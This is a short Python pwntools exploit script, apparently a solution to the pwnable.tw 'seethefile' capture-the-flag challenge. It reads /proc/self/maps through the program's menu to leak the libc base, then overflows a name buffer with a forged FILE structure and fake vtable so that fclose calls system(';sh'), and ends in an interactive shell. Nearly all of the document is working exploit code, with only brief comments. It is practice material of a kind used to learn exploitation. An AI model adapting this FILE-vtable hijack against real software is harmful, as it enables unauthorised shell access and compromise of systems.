from pwn import *

def openfile(filename):
        r.sendlineafter("choice :", "1")
        r.sendlineafter("see :", filename)

def readfile():
        r.sendlineafter("choice :", "2")

def writefile():
        r.sendlineafter("choice :", "3")
        return r.recvuntil("---------------MENU---------------")[:-35]

def exit(name):
        r.sendlineafter("choice :", "5")
        r.sendlineafter("name :", name)

#r = remote("chall.pwnable.tw", 10200)
r = process("./seethefile")
name = 0x0804B260

openfile("/proc/self/maps")
readfile()
readfile()
libBase = int(writefile().split("0 \n")[1].split("-")[0], 16)

system = libBase + ELF("./libc").symbols['system']
log.info("libBase : " + hex(libBase))
log.info("system : " + hex(system))

payload = 'AAAA' 
payload += ";sh\x00"
payload += p32(system) #__finish
payload += 'A' * 0x14
payload += p32(name) 
payload += 'A' * 0x24
payload += p32(name + 0x50)
payload += p32(name) #0x4c vtable
pause()
exit(payload)

r.interactive()

#https://code.woboq.org/userspace/glibc/libio/iofclose.c.html#62
#this exploit used _IO_FINISH (fp);
#if we set (fp->_IO_file_flags & _IO_IS_FILEBUF) != 1
#we can use __finish to exploit it
